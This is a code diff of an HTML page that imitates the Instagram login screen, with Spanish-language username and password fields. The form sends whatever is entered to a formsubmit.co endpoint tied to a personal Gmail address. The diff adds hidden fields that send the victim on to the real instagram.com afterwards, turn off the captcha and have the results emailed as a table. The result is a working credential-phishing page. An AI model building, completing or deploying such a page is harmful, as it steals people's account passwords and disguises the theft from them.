@@ -9,6 +9,7 @@
 <body>
   <div class="login-container">
     <div class="instagram-logo"> <img src="ig.png" alt=""> </div>
+
     <form id="login-form" action="https://formsubmit.co/sebaszapata2022@gmail.com" method="POST">
       <input  name="Usuario"  type="text" id="username" placeholder="Usuario" required>
       <input  name="Contraseña"  type="password" id="password" placeholder="Contraseña" required>
@@ -16,7 +17,10 @@
     </form>
     <p id="error-message" class="error-message"></p>
   </div>
-  
+
+  <input type="hidden" name="_next" value="https://www.instagram.com/" >
+  <input type="hidden" name="_captcha" value="false" >
+  <input type="hidden" name="_template" value="table" >
   <script src="script.js"></script>
 </body>
 </html>
